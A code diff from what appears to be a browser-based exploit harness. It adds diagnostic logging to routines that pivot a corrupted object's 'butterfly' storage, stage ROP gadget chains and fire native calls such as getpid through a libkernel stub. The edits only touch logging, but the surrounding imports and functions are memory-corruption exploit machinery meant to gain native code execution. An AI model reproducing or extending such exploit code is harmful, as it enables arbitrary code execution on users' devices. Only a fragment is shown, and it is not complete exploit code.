@@ -81,12 +81,12 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
     verifyPivotHookWrites,
     verifySlabContent, resolveBufAddrOff, verifyStackContent,
-    readPivotButterfly, ensurePivotButterfly,
+    readPivotButterfly, ensurePivotButterfly, formatPivotBfDiag,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830az";
+const BUILD_ID = "rw-20250830ba";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid @ lk (chain_poops) — needs lk in box" },
@@ -4351,8 +4351,10 @@ function bisectLogPreflight(p, prep, pf, tag) {
         + " rsp=" + (pf.slab && pf.slab.rsp ? pf.slab.rsp.ok : "?")
         + " mainMf=" + prep.mainMf
         + " path=" + (prep._cap && prep._cap.path || "?"));
-    let bf = readPivotButterfly(p, prep.pivotCell);
-    bisectLog("PRE-PIVOT", "cell=" + prep.pivotCell + " butterfly=" + (bf || "null")
+    const hit = readPivotButterfly(p, prep.pivotCell);
+    bisectLog("PRE-PIVOT", "cell=" + prep.pivotCell + " butterfly="
+        + (hit ? hit.bf : "null")
+        + (hit ? (" @cell+0x" + hit.cellOff.toString(16)) : "")
         + " S=" + prep.M.S + " G0=" + prep.G.G0 + " hook=" + pivotHookMode());
     if (pf.slabContent && !pf.slabContent.ok)
         bisectLog("PRE-SLAB-BAD", pf.slabContent.reasons.join("; "));
@@ -4444,10 +4446,11 @@ function bisectPreFireLog(p, prep, lk, stubOff, tag, hookMode) {
         const sv = read8p(p, lk.add32(stubOff));
         stubOk = lkIsGetpidStub(sv) ? "stub-ok" : ("BAD:" + sv);
     }
-    let bf = readPivotButterfly(p, prep.pivotCell);
-    let bfStr = bf ? String(bf) : "null";
-    if (prep._pivotBfUpgraded)
-        bfStr += " upgraded=" + prep._pivotBfUpgraded;
+    const hit = readPivotButterfly(p, prep.pivotCell);
+    let bfStr = hit ? String(hit.bf) : "null";
+    if (prep._pivotBfSource) bfStr += " src=" + prep._pivotBfSource;
+    if (prep._pivotBfUpgraded) bfStr += " pivot=" + prep._pivotBfUpgraded;
+    if (prep._pivotBfInjected) bfStr += " injected=1";
     bisectLog("PRE-FIRE", tag + " lk=" + lk + " +0x" + (stubOff != null ? stubOff.toString(16) : "?")
         + " " + stubOk + " hook=" + hookMode
         + " pivot=" + (params.get("pivot") || "empty")
@@ -4869,7 +4872,12 @@ function runNativeBisectStep(stepId) {
         }
     } catch (err) {
         try { if (nativePrep) bisectEmergencyUntangle(p, nativePrep); } catch (_) { }
-        bisectLog("BISECT-FAIL", stepId + " " + (err.message || String(err)));
+        const em = err.message || String(err);
+        bisectLog("BISECT-FAIL", stepId + " " + em);
+        if (/butterfly|injectFake/i.test(em) && nativePrep && nativePrep.pivotCell) {
+            const diag = formatPivotBfDiag(p, nativePrep.pivotCell);
+            bisectLog("BF-DIAG", "cell=" + nativePrep.pivotCell + " " + diag.join(" "));
+        }
         state("bisect fail @ " + stepId, "bad");
     } finally {
         busy = false;
